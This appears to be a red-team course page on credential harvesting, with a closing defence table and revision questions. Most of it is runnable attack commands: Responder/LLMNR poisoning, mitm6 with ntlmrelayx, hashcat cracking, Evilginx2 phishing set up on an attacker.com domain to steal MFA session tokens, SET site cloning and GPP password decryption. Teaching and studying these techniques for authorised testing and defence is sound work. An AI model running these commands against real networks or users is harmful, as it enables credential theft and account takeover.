# Credential Harvesting

## Unit 3 - Topic 1 | Initial Access Scenarios

---

## Overview

**Credential harvesting** is the process of capturing usernames and passwords during the initial access phase. Techniques range from intercepting network authentication to social engineering attacks that trick users into submitting credentials to attacker-controlled infrastructure.

---

## 1. Credential Harvesting Methods

```
CREDENTIAL HARVESTING TAXONOMY:

NETWORK-BASED:
├── LLMNR/NBT-NS Poisoning (Responder)
├── MITM attacks (ARP spoofing)
├── WPAD spoofing
├── DHCPv6 poisoning
├── SMB relay attacks
└── NTLM downgrade attacks

SOCIAL ENGINEERING:
├── Phishing pages (cloned login portals)
├── Credential capture forms
├── OAuth phishing
├── Browser-in-the-Browser (BitB)
└── QR code phishing

ENDPOINT-BASED:
├── Keyloggers
├── Clipboard capture
├── Browser credential theft
├── Memory dump (LSASS)
└── Credential manager dump

FILE-BASED:
├── Configuration files with passwords
├── Scripts with hardcoded creds
├── Password files on shares
├── Database connection strings
└── Cloud config files
```

---

## 2. Network Credential Harvesting

```bash
# === RESPONDER (LLMNR/NBT-NS Poisoning) ===
# Most common internal credential capture method
# Captures NTLMv2 hashes on the network

sudo responder -I eth0 -wrf
# -I: Interface
# -w: WPAD poisoning
# -r: Answer NETBIOS wredir queries
# -f: Force WPAD auth

# Responder captures NTLMv2 hashes when:
# 1. User mistypes UNC path: \\servr\share (typo)
# 2. DNS fails → LLMNR/NBT-NS broadcasts query
# 3. Responder answers: "I'm that server!"
# 4. Client sends NTLMv2 auth → captured!

# Hash format captured:
# user::DOMAIN:challenge:NTLMResponse:...

# Crack with hashcat:
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt

# === MITM6 (IPv6 DNS Takeover) ===
sudo mitm6 -d corp.local
# Responds to DHCPv6 requests
# Sets attacker as IPv6 DNS server
# Captures credentials via WPAD/proxy auth

# Combined with ntlmrelayx:
sudo mitm6 -d corp.local &
ntlmrelayx.py -6 -t ldaps://dc01 -wh wpad.corp.local \
  -l lootdir/
# Creates new machine account or dumps LDAP data
```

---

## 3. Phishing for Credentials

```bash
# === GOPHISH (Phishing Framework) ===
# Full phishing campaign management
./gophish
# Web interface: https://localhost:3333
# Steps: Create template → Create landing page →
#        Create group → Launch campaign

# === EVILGINX2 (Reverse Proxy Phishing) ===
# Captures cookies AND credentials (bypasses MFA!)
evilginx2
: config domain attacker.com
: config ip 1.2.3.4
: phishlets hostname o365 login.attacker.com
: phishlets enable o365
: lures create o365
: lures get-url 0
# User visits fake login → real login proxied
# Session tokens captured → MFA bypassed!

# === SOCIAL ENGINEERING TOOLKIT (SET) ===
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner
# Enter URL to clone (e.g., https://mail.corp.com)
# Captures POSTed credentials

# === MODLISHKA ===
# Another reverse proxy for credential + token capture
modlishka -config modlishka.json
```

---

## 4. File-Based Credential Discovery

```bash
# === SEARCHING SHARES FOR CREDENTIALS ===
# CrackMapExec spider:
crackmapexec smb dc01 -u user -p pass --spider C$ \
  --pattern "password|credential|login" --depth 3

# Snaffler (finds interesting files):
.\Snaffler.exe -s -o snaffler_output.txt
# Searches shares for: passwords, configs, scripts

# === COMMON PASSWORD LOCATIONS ===
# Group Policy Preferences (GPP):
# \\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\
# Groups.xml, Services.xml, DataSources.xml
# Contains AES-encrypted passwords (MS published the key!)

# Decrypt GPP password:
gpp-decrypt "cPassword_value_from_XML"

# PowerView:
Get-GPPPassword

# === SEARCH FILES ===
# PowerShell:
Get-ChildItem -Path \\dc01\SYSVOL -Recurse -Include *.xml,*.txt,*.ini | \
  Select-String -Pattern "password|pwd|cred" -List

# Linux:
smbclient //dc01/SYSVOL -U user%pass -c "recurse;prompt;mget *"
grep -ri "password\|cpassword" ./
```

---

## 5. Defense Against Credential Harvesting

| Attack | Defense |
|--------|---------|
| **LLMNR poisoning** | Disable LLMNR and NBT-NS via GPO |
| **WPAD spoofing** | Disable WPAD or configure proper WPAD DNS |
| **Phishing** | Security awareness training, phishing simulations |
| **MFA bypass** | FIDO2/WebAuthn hardware keys |
| **GPP passwords** | MS14-025 patch removes GPP cpassword storage |
| **Network MITM** | 802.1x, network segmentation, SMB signing |
| **File-based** | Remove passwords from scripts, use vaults |

---

## Summary Table

| Technique | Tool | Captured |
|-----------|------|----------|
| **LLMNR/NBT-NS** | Responder | NTLMv2 hashes |
| **DHCPv6** | mitm6 | NTLM auth, LDAP data |
| **Phishing** | Evilginx2, GoPhish | Credentials + tokens |
| **SMB relay** | ntlmrelayx | Relayed authentication |
| **GPP** | gpp-decrypt | Plaintext passwords |
| **Share spider** | Snaffler, CME | Passwords in files |

---

## Quick Revision Questions

1. **How does LLMNR poisoning capture credentials?**
2. **What tool bypasses MFA through reverse proxy phishing?**
3. **Where are GPP passwords found and how are they decrypted?**
4. **What is the most effective defense against LLMNR attacks?**
5. **How does mitm6 exploit IPv6 for credential capture?**

---

[Next: Phishing for Credentials →](02-phishing-for-credentials.md)

---

*Unit 3 - Topic 1 of 6 | [Back to README](../README.md)*
